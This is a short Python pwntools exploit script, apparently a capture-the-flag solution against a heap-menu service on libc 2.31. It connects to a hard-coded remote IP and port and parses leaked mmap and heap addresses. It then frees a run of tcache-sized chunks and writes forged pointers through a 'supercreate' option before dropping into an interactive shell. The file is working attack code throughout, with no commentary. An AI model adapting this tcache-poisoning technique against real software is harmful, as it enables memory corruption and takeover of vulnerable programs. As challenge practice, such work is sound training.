from pwn import *

###Util
def create(size,uuid,data):
    r.sendlineafter('Choice >','1')
    r.sendlineafter('size : ',str(size))
    r.sendlineafter('UUID : ',str(uuid))
    r.sendafter('Content : ',data)

def edit(idx,uuid):
    r.sendlineafter('Choice >','2')
    r.sendlineafter('index : ',str(idx))
    r.sendlineafter('UUID : ',str(uuid))

def delete(idx):
    r.sendlineafter('Choice >','3')
    r.sendlineafter('index : ',str(idx))

def supercreate(size,uuid,data):
    r.sendlineafter('Choice >','4')
    r.sendlineafter('size : ',str(size))
    r.sendlineafter('UUID : ',str(uuid))
    r.sendafter('Content : ',data)

def backdoor():
    r.sendlineafter('Choice >','5')

###Addr
#  libc2.31

###Exploit
r = remote('140.112.31.97',30107)

mmap_addr = int(r.recvline()[:-1].split(b'0x')[1],16)-0x18
print(hex(mmap_addr))
heap_addr = int(r.recvline()[:-1].split(b'0x')[1],16)-0x2a0
print(hex(heap_addr))

for i in range(8):
    create(0x78,0,'M30W')
for i in range(1,8):
    delete(i)
delete(0)
supercreate(0x78,0,p64(heap_addr+0x2b0)+p64(mmap_addr+0x8))
create(0x88,0,'M30W')

edit(0,heap_addr+0x6b0)
create(0x78,0,'M30W')

r.interactive()
